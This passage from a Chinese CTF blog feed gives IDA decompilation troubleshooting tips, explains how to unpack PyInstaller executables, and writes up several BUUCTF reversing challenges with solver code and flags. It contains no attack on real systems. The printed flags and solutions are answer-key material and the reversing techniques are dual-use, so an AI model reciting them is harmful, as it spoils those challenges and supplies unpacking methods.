        <content type="html"><![CDATA[<h1 id="call-analysis-failed"><a href="#call-analysis-failed" class="headerlink" title="call analysis failed"></a>call analysis failed</h1><a id="more"></a><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1.PNG"></p><p>按下space键，找到错误地址：401095<br>进入call后面的函数</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2.PNG"></p><p>选中整个函数，按‘d’转为数据，然后按下‘c’转换为代码</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/3.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4.PNG"></p><p>返回原来函数中，就可以f5了</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5.PNG"></p><h1 id="无法选中函数"><a href="#无法选中函数" class="headerlink" title="无法选中函数"></a>无法选中函数</h1><p>找到了main函数，f5却显示没有选中函数</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/6.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/7.PNG"></p><p>这里是main函数没有被识别<br>选中前面地址为红色的代码，按下‘p’，main函数就有了。</p><h1 id="positive-sp-value-has-been-found"><a href="#positive-sp-value-has-been-found" class="headerlink" title="positive sp value has been found"></a>positive sp value has been found</h1><p>堆栈不平衡导致</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8.PNG"></p><p>打开选项中的常规（Options中的第一个），勾选上堆栈指针选项</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9.PNG"></p><p>确定后界面是这样的</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/10.PNG"></p><p>选中图中指令部分(图中高亮代码)，按下 alt+k 更改堆栈指针，知道前面的堆栈指针均为正式且retn前堆栈指针值为0时就成功了。</p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/11.PNG"></p><p><img src="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/12.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将python打包的.exe文件还原成.py文件</title>
      <link href="/2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/"/>
      <url>/2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="下载-pyinstxtractor-py"><a href="#下载-pyinstxtractor-py" class="headerlink" title="下载 pyinstxtractor.py"></a>下载 pyinstxtractor.py</h1><a id="more"></a><p>地址：<a href="https://buuoj.cn/challenges#[HDCTF2019]Maze">https://sourceforge.net/projects/pyinstallerextractor/</a></p><h1 id="把pyinstxtractor-py和exe文件放在同个目录下"><a href="#把pyinstxtractor-py和exe文件放在同个目录下" class="headerlink" title="把pyinstxtractor.py和exe文件放在同个目录下"></a>把pyinstxtractor.py和exe文件放在同个目录下</h1><p>打开cmd，进入该目录，输入：</p><blockquote><p>python pyinstxtractor.py xx.exe</p></blockquote><p>运行后生成xx.exe_extracted文件夹。</p><p><img src="/2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/1.PNG"></p><p>找到 Possible entry point 后的文件，在其前面加上pyc文件头</p><blockquote><p>420d 0d0a 0000 0000 0da9 1b60 a809 0000</p></blockquote><p>添加文件头可以使用010 Editor或Sublime Text 3等等。<br>原博客地址: <a href="https://blog.csdn.net/tymatlab/article/details/80511709">https://blog.csdn.net/tymatlab/article/details/80511709</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录2</title>
      <link href="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
      <url>/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[HDCTF2019]Maze">题目链接</a><br>查看文件信息，有upx壳，脱去。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/1.PNG"></p><p>由字符串找到关键函数</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/2.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/3.PNG"></p><p>有一个花指令和没有声明的main函数，去掉花指令，在建立main函数即可。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/4.PNG"></p><p>转为数据，再将 0E8h nop掉，在转换回代码，然后识别main函数。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/5.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/6.PNG"></p><p>这之后就简单了，根据题目名和一个很明显的迷宫字符串，可知这是迷宫题。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/7.PNG"></p><p>重+走到F就行了</p><blockquote><p>flag{ssaaasaassdddw}</p></blockquote><h1 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h1><p><a href="https://buuoj.cn/challenges#[MRCTF2020]Xor">题目链接</a><br>查看文件信息, 32位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/8.PNG"></p><p>找到关键函数，f5反编译</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/9.PNG"></p><p>转为文本模式，找到那个地址，点进去，转为数据，再转为代码，就可以f5了。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/10.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/11.PNG"></p><p>一个简单的异或<br>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">27</span>]=<span class="string">&quot;MSAWB~FXZ:J:`tQJ\&quot;N@ bpdd&#125;8g&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">27</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]^=i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;@_R3@1ly_E2_R3verse!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h1><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easyre">题目链接</a><br>查看文件信息, 64位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/12.PNG"></p><p>进入main函数里，有三个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/13.PNG"></p><p>第一个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/14.PNG"></p><p>一个正常的base64加密</p><p>第二个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/15.PNG"></p><p>第三个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/16.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/17.PNG"></p><p>下面那个为加密二，上面的是加密三，加密三其实就是个变形的凯撒。</p><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">52</span>]=<span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> table[<span class="number">65</span>]=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> padding_char=<span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encode_three</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; b; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a[i] &lt;= <span class="number">64</span> || a[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a[i] &lt;= <span class="number">96</span> || a[i] &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a[i] &lt;= <span class="number">47</span> || a[i] &gt; <span class="number">57</span> )</span><br><span class="line">         a[i] = a[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        a[i] -= <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="number">47</span>)</span><br><span class="line">        a[i]+=<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;<span class="number">57</span>)</span><br><span class="line">        a[i]-=<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">          </span><br><span class="line">     &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        a[i] -= <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="number">97</span>)</span><br><span class="line">        a[i]+=<span class="number">26</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a[i] -= <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span>(a[i]&lt;<span class="number">65</span>)</span><br><span class="line">        a[i]+=<span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encode_two</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">strncpy</span>(b+<span class="number">26</span>,a,<span class="number">13</span>);</span><br><span class="line"><span class="built_in">strncpy</span>(b,a+<span class="number">13</span>,<span class="number">13</span>);</span><br><span class="line"><span class="built_in">strncpy</span>(b+<span class="number">39</span>,a+<span class="number">26</span>,<span class="number">13</span>);</span><br><span class="line"><span class="built_in">strncpy</span>(b+<span class="number">13</span>,a+<span class="number">39</span>,<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findchr</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">array</span>,<span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(<span class="built_in">array</span>);i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">array</span>[i]==ch)&#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base64_decode</span><span class="params">(<span class="keyword">char</span> *src,<span class="keyword">char</span> *result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> base_len;</span><br><span class="line">    <span class="keyword">int</span> i,j=<span class="number">0</span>;</span><br><span class="line">    base_len=<span class="built_in">strlen</span>(src);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;base_len;i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(src[i]==padding_char)</span><br><span class="line">            src[i]=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;base_len;i+=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">        result[j++]=(findchr(table,src[i])&lt;&lt;<span class="number">2</span>)+(findchr(table,src[i+<span class="number">1</span>])&gt;&gt;<span class="number">4</span>);</span><br><span class="line">        result[j++]=(findchr(table,src[i+<span class="number">1</span>])&lt;&lt;<span class="number">4</span>)+(findchr(table,src[i+<span class="number">2</span>])&gt;&gt;<span class="number">2</span>);</span><br><span class="line">        result[j++]=((findchr(table,src[i+<span class="number">2</span>])&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>)+(findchr(table,src[i+<span class="number">3</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> str3[<span class="number">100</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> str2[<span class="number">52</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">encode_three(str, <span class="number">52</span>);</span><br><span class="line">encode_two(str, str2);</span><br><span class="line">base64_decode(str2, str3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GWHT{672cc4778a38e80cb362987341133ea2}</p></blockquote><h1 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h1><p>查看文件信息, 64位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/18.PNG"></p><p>进入main函数和加密函数</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/19.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/20.PNG"></p><p>只是改了一下密码表<br>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[]=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> b[]=<span class="string">&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> c[]=<span class="string">&quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="built_in">strlen</span>(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[j]==c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]=a[j];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后去在线解密</p><blockquote><p>flag{Special_Base64_By_Lich}</p></blockquote><h1 id="羊城杯-2020-login"><a href="#羊城杯-2020-login" class="headerlink" title="[羊城杯 2020]login"></a>[羊城杯 2020]login</h1><p>附件为py可执行文件，使用pyinstxtractor导出pyc文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/21.PNG"></p><p>在login前加上pyc文件头，另存为login.pyc，即可反编译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">input1 = <span class="built_in">input</span>(<span class="string">&#x27;input something:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input1) != <span class="number">14</span>:</span><br><span class="line">    print(<span class="string">&#x27;Wrong length!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    code.append(<span class="built_in">ord</span>(input1[i]) ^ <span class="built_in">ord</span>(input1[i + <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">code.append(<span class="built_in">ord</span>(input1[<span class="number">13</span>]))</span><br><span class="line">a1 = code[<span class="number">2</span>]</span><br><span class="line">a2 = code[<span class="number">1</span>]</span><br><span class="line">a3 = code[<span class="number">0</span>]</span><br><span class="line">a4 = code[<span class="number">3</span>]</span><br><span class="line">a5 = code[<span class="number">4</span>]</span><br><span class="line">a6 = code[<span class="number">5</span>]</span><br><span class="line">a7 = code[<span class="number">6</span>]</span><br><span class="line">a8 = code[<span class="number">7</span>]</span><br><span class="line">a9 = code[<span class="number">9</span>]</span><br><span class="line">a10 = code[<span class="number">8</span>]</span><br><span class="line">a11 = code[<span class="number">10</span>]</span><br><span class="line">a12 = code[<span class="number">11</span>]</span><br><span class="line">a13 = code[<span class="number">12</span>]</span><br><span class="line">a14 = code[<span class="number">13</span>]</span><br><span class="line"><span class="keyword">if</span> ((((a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">22748</span>) &amp; ((((a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span>) + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span>) + a14 * <span class="number">17</span> == <span class="number">7258</span>) &amp; ((((a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span>) + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span>) + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span>) + a14 * <span class="number">23</span> == <span class="number">26190</span>) &amp; ((((a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">37136</span>) &amp; (((a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span>) + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) &amp; ((((a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span>) + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span>) + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">28</span> == <span class="number">17298</span>) &amp; ((((a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span>) + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span>) + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span>) + a14 * <span class="number">65</span> == <span class="number">19875</span>) &amp; (((a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span>) + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) &amp; ((((a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span>) + a14 * <span class="number">27</span> == <span class="number">9710</span>) &amp; (((((a1 * <span class="number">67</span> - a2 * <span class="number">68</span>) + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span>) + a14 * <span class="number">31</span> == <span class="number">13376</span>) &amp; ((((a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span>) + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span 